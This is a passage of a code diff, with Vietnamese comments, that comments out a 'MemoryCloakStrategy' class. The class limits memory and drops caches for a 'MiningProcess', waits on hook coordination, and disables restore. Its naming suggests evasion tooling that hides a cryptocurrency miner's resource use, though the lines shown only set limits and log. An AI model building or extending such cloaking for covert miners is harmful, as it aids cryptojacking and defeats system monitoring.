-        :return: bool - True nếu Memory cloaking áp dụng thành công, False nếu thất bại
-        """
-        try:
-            pid, name = process.pid, process.name
+#         :param process: Đối tượng MiningProcess.
+#         :return: bool - True nếu Memory cloaking áp dụng thành công, False nếu thất bại
+#         """
+#         try:
+#             pid, name = process.pid, process.name
 
-            ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
-            if not ok_mem:
-                self.logger.error(f"[Memory Cloaking] Không thể set memory_limit cho PID={pid}.")
-                return False  # ✅ FAILURE: Cannot set memory limit
+#             ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
+#             if not ok_mem:
+#                 self.logger.error(f"[Memory Cloaking] Không thể set memory_limit cho PID={pid}.")
+#                 return False  # ✅ FAILURE: Cannot set memory limit
             
-            self.logger.info(f"[Memory Cloaking] PID={pid}, memory_limit={self.memory_limit_mb}MB.")
+#             self.logger.info(f"[Memory Cloaking] PID={pid}, memory_limit={self.memory_limit_mb}MB.")
 
-            # Cũng có thể drop cache (nếu muốn)
-            ok_cache = self.cache_resource_manager.drop_caches()
-            if ok_cache:
-                self.logger.info(f"[Memory Cloaking] Đã drop caches cho PID={pid}.")
+#             # Cũng có thể drop cache (nếu muốn)
+#             ok_cache = self.cache_resource_manager.drop_caches()
+#             if ok_cache:
+#                 self.logger.info(f"[Memory Cloaking] Đã drop caches cho PID={pid}.")
             
-            return True  # ✅ SUCCESS: Memory cloaking applied successfully
+#             return True  # ✅ SUCCESS: Memory cloaking applied successfully
 
-        except psutil.NoSuchProcess as e:
-            # ✅ ERROR REPORTING: Process not found error
-            error_reporter.report_error(
-                ErrorCode.PROCESS_NOT_FOUND,
-                f"Memory Cloaking: Tiến trình không tồn tại: {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='MemoryCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='Memory',
-                context_data={'process_name': process.name, 'error': str(e)},
-                exception=e
-            )
-            self.logger.error(f"Memory Cloaking: Tiến trình không tồn tại: {e}")
-            return False  # ✅ FAILURE: Process does not exist
-        except psutil.AccessDenied as e:
-            # ✅ ERROR REPORTING: Access denied error
-            error_reporter.report_error(
-                ErrorCode.PROCESS_ACCESS_DENIED,
-                f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='MemoryCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='Memory',
-                context_data={'process_name': process.name, 'error': str(e)},
-                exception=e
-            )
-            self.logger.error(f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
-            return False  # ✅ FAILURE: Access denied
-        except Exception as e:
-            # ✅ ERROR REPORTING: General strategy application failure
-            error_reporter.report_error(
-                ErrorCode.STRATEGY_APPLICATION_FAILED,
-                f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='MemoryCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='Memory',
-                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
-                exception=e
-            )
-            self.logger.error(
-                f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            return False  # ✅ FAILURE: Memory cloaking failed
+#         except psutil.NoSuchProcess as e:
+#             # ✅ ERROR REPORTING: Process not found error
+#             error_reporter.report_error(
+#                 ErrorCode.PROCESS_NOT_FOUND,
+#                 f"Memory Cloaking: Tiến trình không tồn tại: {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='MemoryCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='Memory',
+#                 context_data={'process_name': process.name, 'error': str(e)},
+#                 exception=e
+#             )
+#             self.logger.error(f"Memory Cloaking: Tiến trình không tồn tại: {e}")
+#             return False  # ✅ FAILURE: Process does not exist
+#         except psutil.AccessDenied as e:
+#             # ✅ ERROR REPORTING: Access denied error
+#             error_reporter.report_error(
+#                 ErrorCode.PROCESS_ACCESS_DENIED,
+#                 f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='MemoryCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='Memory',
+#                 context_data={'process_name': process.name, 'error': str(e)},
+#                 exception=e
+#             )
+#             self.logger.error(f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+#             return False  # ✅ FAILURE: Access denied
+#         except Exception as e:
+#             # ✅ ERROR REPORTING: General strategy application failure
+#             error_reporter.report_error(
+#                 ErrorCode.STRATEGY_APPLICATION_FAILED,
+#                 f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='MemoryCloakStrategy.apply',
+#                 process_id=process.pid,
+#                 strategy_name='Memory',
+#                 context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
+#                 exception=e
+#             )
+#             self.logger.error(
+#                 f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+#             )
+#             return False  # ✅ FAILURE: Memory cloaking failed
 
-    def apply_with_coordination(self, process: MiningProcess, coordinator, timeout: int = 70) -> bool:
-        """
-        **Coordinated Memory Cloaking** (che giấu bộ nhớ có phối hợp)
+#     def apply_with_coordination(self, process: MiningProcess, coordinator, timeout: int = 70) -> bool:
+#         """
+#         **Coordinated Memory Cloaking** (che giấu bộ nhớ có phối hợp)
         
-        Apply memory cloaking only after proper hook coordination to prevent
-        uncoordinated operations that can lead to std::bad_alloc.
+#         Apply memory cloaking only after proper hook coordination to prevent
+#         uncoordinated operations that can lead to std::bad_alloc.
         
-        Args:
-            process: MiningProcess object (đối tượng tiến trình khai thác)
-            coordinator: Hook coordinator instance (thể hiện điều phối hook)
-            timeout: Coordination timeout in seconds (thời gian chờ phối hợp tính bằng giây)
+#         Args:
+#             process: MiningProcess object (đối tượng tiến trình khai thác)
+#             coordinator: Hook coordinator instance (thể hiện điều phối hook)
+#             timeout: Coordination timeout in seconds (thời gian chờ phối hợp tính bằng giây)
             
-        Returns:
-            bool: True if coordinated cloaking successful, False if failed/aborted
-                  (True nếu che giấu có phối hợp thành công, False nếu thất bại/hủy bỏ)
-        """
-        try:
-            pid, name = process.pid, process.name
+#         Returns:
+#             bool: True if coordinated cloaking successful, False if failed/aborted
+#                   (True nếu che giấu có phối hợp thành công, False nếu thất bại/hủy bỏ)
+#         """
+#         try:
+#             pid, name = process.pid, process.name
             
-            self.logger.info(f"🔄 [COORDINATED CLOAKING] Starting coordination for PID={pid}, timeout={timeout}s")
+#             self.logger.info(f"🔄 [COORDINATED CLOAKING] Starting coordination for PID={pid}, timeout={timeout}s")
             
-            # **Critical: Wait for hook coordination** (quan trọng: chờ phối hợp hook)
-            if not coordinator.wait_for_hooks_ready(pid, timeout):
-                # **Coordination failed - ABORT cloaking** (phối hợp thất bại - HỦY che giấu)
-                self.logger.error(f"❌ [COORDINATION FAILED] Hook coordination timeout for PID={pid}")
-                self.logger.error(f"🚨 [ABORT] Memory cloaking ABORTED to prevent std::bad_alloc")
-                self.logger.error(f"💡 [SOLUTION] Increase hook timeout or fix hook coordination system")
+#             # **Critical: Wait for hook coordination** (quan trọng: chờ phối hợp hook)
+#             if not coordinator.wait_for_hooks_ready(pid, timeout):
+#                 # **Coordination failed - ABORT cloaking** (phối hợp thất bại - HỦY che giấu)
+#                 self.logger.error(f"❌ [COORDINATION FAILED] Hook coordination timeout for PID={pid}")
+#                 self.logger.error(f"🚨 [ABORT] Memory cloaking ABORTED to prevent std::bad_alloc")
+#                 self.logger.error(f"💡 [SOLUTION] Increase hook timeout or fix hook coordination system")
                 
-                # **Report coordination failure** (báo cáo lỗi phối hợp)
-                error_reporter.report_error(
-                    ErrorCode.STRATEGY_APPLICATION_FAILED,
-                    f"Hook coordination timeout - Memory cloaking aborted for PID={pid}",
-                    ErrorSeverity.HIGH,
-                    module='cloak_strategies',
-                    function='MemoryCloakStrategy.apply_with_coordination',
-                    process_id=pid,
-                    strategy_name='Memory',
-                    context_data={
-                        'process_name': name,
-                        'timeout': timeout,
-                        'coordination_status': 'FAILED',
-                        'action': 'ABORTED'
-                    }
-                )
-                return False  # **ABORT cloaking** thay vì force proceed
+#                 # **Report coordination failure** (báo cáo lỗi phối hợp)
+#                 error_reporter.report_error(
+#                     ErrorCode.STRATEGY_APPLICATION_FAILED,
+#                     f"Hook coordination timeout - Memory cloaking aborted for PID={pid}",
+#                     ErrorSeverity.HIGH,
+#                     module='cloak_strategies',
+#                     function='MemoryCloakStrategy.apply_with_coordination',
+#                     process_id=pid,
+#                     strategy_name='Memory',
+#                     context_data={
+#                         'process_name': name,
+#                         'timeout': timeout,
+#                         'coordination_status': 'FAILED',
+#                         'action': 'ABORTED'
+#                     }
+#                 )
+#                 return False  # **ABORT cloaking** thay vì force proceed
             
-            # **Coordination successful - proceed safely** (phối hợp thành công - tiến hành an toàn)
-            self.logger.info(f"✅ [COORDINATION SUCCESS] Hooks ready for PID={pid} - proceeding with safe cloaking")
+#             # **Coordination successful - proceed safely** (phối hợp thành công - tiến hành an toàn)
+#             self.logger.info(f"✅ [COORDINATION SUCCESS] Hooks ready for PID={pid} - proceeding with safe cloaking")
             
-            # **Apply memory limits with coordination** (áp dụng giới hạn bộ nhớ với phối hợp)
-            return self.apply_memory_limits(process)
+#             # **Apply memory limits with coordination** (áp dụng giới hạn bộ nhớ với phối hợp)
+#             return self.apply_memory_limits(process)
             
-        except Exception as e:
-            # **Error during coordination** (lỗi trong quá trình phối hợp)
-            error_reporter.report_error(
-                ErrorCode.STRATEGY_APPLICATION_FAILED,
-                f"Error during coordinated memory cloaking for PID={process.pid}: {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='MemoryCloakStrategy.apply_with_coordination',
-                process_id=process.pid,
-                strategy_name='Memory',
-                context_data={
-                    'process_name': process.name,
-                    'error': str(e),
-                    'stack_trace': traceback.format_exc()
-                },
-                exception=e
-            )
-            self.logger.error(f"❌ [COORDINATION ERROR] Error during coordinated cloaking for PID={process.pid}: {e}")
-            return False
+#         except Exception as e:
+#             # **Error during coordination** (lỗi trong quá trình phối hợp)
+#             error_reporter.report_error(
+#                 ErrorCode.STRATEGY_APPLICATION_FAILED,
+#                 f"Error during coordinated memory cloaking for PID={process.pid}: {e}",
+#                 ErrorSeverity.HIGH,
+#                 module='cloak_strategies',
+#                 function='MemoryCloakStrategy.apply_with_coordination',
+#                 process_id=process.pid,
+#                 strategy_name='Memory',
+#                 context_data={
+#                     'process_name': process.name,
+#                     'error': str(e),
+#                     'stack_trace': traceback.format_exc()
+#                 },
+#                 exception=e
+#             )
+#             self.logger.error(f"❌ [COORDINATION ERROR] Error during coordinated cloaking for PID={process.pid}: {e}")
+#             return False
     
-    def apply_memory_limits(self, process: MiningProcess) -> bool:
-        """
-        **Apply Memory Limits** (áp dụng giới hạn bộ nhớ)
+#     def apply_memory_limits(self, process: MiningProcess) -> bool:
+#         """
+#         **Apply Memory Limits** (áp dụng giới hạn bộ nhớ)
         
-        Internal method to apply memory limits after coordination is confirmed.
-        This is the actual memory limiting logic extracted from apply() method.
+#         Internal method to apply memory limits after coordination is confirmed.
+#         This is the actual memory limiting logic extracted from apply() method.
         
-        Args:
-            process: MiningProcess object (đối tượng tiến trình khai thác)
+#         Args:
+#             process: MiningProcess object (đối tượng tiến trình khai thác)
             
-        Returns:
-            bool: True if memory limits applied successfully (True nếu áp dụng giới hạn thành công)
-        """
-        try:
-            pid, name = process.pid, process.name
+#         Returns:
+#             bool: True if memory limits applied successfully (True nếu áp dụng giới hạn thành công)
+#         """
+#         try:
+#             pid, name = process.pid, process.name
             
-            # **Check if memory limiting is disabled** (kiểm tra nếu giới hạn bộ nhớ bị tắt)
-            if self.memory_limit_mb <= 0:
-                self.logger.info(f"ℹ️ [MEMORY LIMITS] Memory limiting disabled (limit={self.memory_limit_mb}MB)")
-                return True  # **Success: No limits to apply** (thành công: không có giới hạn để áp dụng)
+#             # **Check if memory limiting is disabled** (kiểm tra nếu giới hạn bộ nhớ bị tắt)
+#             if self.memory_limit_mb <= 0:
+#                 self.logger.info(f"ℹ️ [MEMORY LIMITS] Memory limiting disabled (limit={self.memory_limit_mb}MB)")
+#                 return True  # **Success: No limits to apply** (thành công: không có giới hạn để áp dụng)
             
-            # **Apply memory limit** (áp dụng giới hạn bộ nhớ)
-            ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
-            if not ok_mem:
-                self.logger.error(f"❌ [MEMORY LIMITS] Cannot set memory limit for PID={pid}")
-                return False
+#             # **Apply memory limit** (áp dụng giới hạn bộ nhớ)
+#             ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
+#             if not ok_mem:
+#                 self.logger.error(f"❌ [MEMORY LIMITS] Cannot set memory limit for PID={pid}")
+#                 return False
             
-            self.logger.info(f"✅ [MEMORY LIMITS] Applied limit: PID={pid}, limit={self.memory_limit_mb}MB")
+#             self.logger.info(f"✅ [MEMORY LIMITS] Applied limit: PID={pid}, limit={self.memory_limit_mb}MB")
             
-            # **Drop caches for memory optimization** (xóa cache để tối ưu bộ nhớ)
-            ok_cache = self.cache_resource_manager.drop_caches()
-            if ok_cache:
-                self.logger.info(f"🧹 [CACHE CLEANUP] Dropped caches for PID={pid}")
-            else:
-                self.logger.warning(f"⚠️ [CACHE CLEANUP] Failed to drop caches for PID={pid}")
+#             # **Drop caches for memory optimization** (xóa cache để tối ưu bộ nhớ)
+#             ok_cache = self.cache_resource_manager.drop_caches()
+#             if ok_cache:
+#                 self.logger.info(f"🧹 [CACHE CLEANUP] Dropped caches for PID={pid}")
+#             else:
+#                 self.logger.warning(f"⚠️ [CACHE CLEANUP] Failed to drop caches for PID={pid}")
             
-            return True  # **Success: Memory limits applied** (thành công: đã áp dụng giới hạn bộ nhớ)
+#             return True  # **Success: Memory limits applied** (thành công: đã áp dụng giới hạn bộ nhớ)
             
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"❌ [MEMORY LIMITS] Process not found: PID={process.pid}, error={e}")
-            return False
-        except psutil.AccessDenied as e:
-            self.logger.error(f"❌ [MEMORY LIMITS] Access denied: PID={process.pid}, error={e}")
-            return False
-        except Exception as e:
-            self.logger.error(f"❌ [MEMORY LIMITS] Unexpected error: PID={process.pid}, error={e}")
-            return False
+#         except psutil.NoSuchProcess as e:
+#             self.logger.error(f"❌ [MEMORY LIMITS] Process not found: PID={process.pid}, error={e}")
+#             return False
+#         except psutil.AccessDenied as e:
+#             self.logger.error(f"❌ [MEMORY LIMITS] Access denied: PID={process.pid}, error={e}")
+#             return False
+#         except Exception as e:
+#             self.logger.error(f"❌ [MEMORY LIMITS] Unexpected error: PID={process.pid}, error={e}")
+#             return False
 
-    def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục Memory - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
-        """
-        self.logger.info(f"[MEMORY RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
+#     def restore(self, process: MiningProcess) -> None:
+#         """
+#         Khôi phục Memory - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
+#         """
+#         self.logger.info(f"[MEMORY RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
 
 ###############################################################################
 #                         ✅ ERROR RECOVERY SYSTEM                         #
